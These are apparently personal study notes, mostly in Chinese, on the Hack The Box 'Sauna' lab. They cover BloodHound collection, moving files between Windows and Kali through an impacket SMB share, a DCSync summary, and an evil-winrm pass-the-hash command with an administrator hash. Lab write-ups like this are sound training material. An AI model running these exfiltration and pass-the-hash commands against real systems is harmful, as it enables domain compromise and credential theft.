---
description: SharpHound, BloodHound, Active Directory, ASREPRoasting,DCSync Attack
---

# Hack the box - Sauna

{% embed url="https://0xdf.gitlab.io/2020/07/18/htb-sauna.html#shell-as-fsmith" %}

注意事项

在使用sharphound收集AD信息时，不要使用kali自带的sharphound，需要从github上下载最新的bloodhound.exe.

{% embed url="https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html" %}

## Data Exfiltration，数据渗漏

当需要从windows传送文件到kali上时，可以使用netcat。大致思路是在kali上下载好nc.exe，使用python3 -m http.server 这个指令启动一个临时的http服务器。在Windows上将nc.exe下载并使用nc.exe 和kali自带的netcat传送文件。

在使用python impacket中的smb模组时，用impacket-smbserver指令，而不是smbserver.py。当我在使用smbserver.py时，我的kali出现了鼠标光标变成十字状的情况。当使用impacket-smbserver时，需要加上-smb2support，windows net.exe不支持smb1。

```
# Kali Command:
sudo impacket-smbserver -smb2support smb samba_share
# smb 是 smb share 的名字，samba_share是本地文件夹的名字。

# Windows Command:
net use \\10.10.16.3\smb
cd \\10.10.16.3\smb # 将当前的文件夹转到smb
# 注意使用smb而不是samba_share作为Windows上smb share的名字
```

## 数据处理

在将SharpHound.exe产生的zip文件传到kali后，用Upload Data而不是Import Graph来导入文件。

## DCSync 攻击

{% embed url="https://blog.netwrix.com/2021/11/30/what-is-dcsync-an-introduction" %}
关于DCSync 攻击不错的文章
{% endembed %}

总结一下文章的内容就是一些拥有

* Replicating Directory Changes
* Replicating Directory Changes All

权限的账户可以通过request domain replication获得用户密码的哈希函数（hash）。

## 通过WMI和Hash提权

{% embed url="https://www.ired.team/offensive-security/privilege-escalation/pass-the-hash-privilege-escalation-with-invoke-wmiexec" %}

evil-winrm -i 10.10.10.175 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e

![](.gitbook/assets/admin\_hash.png)
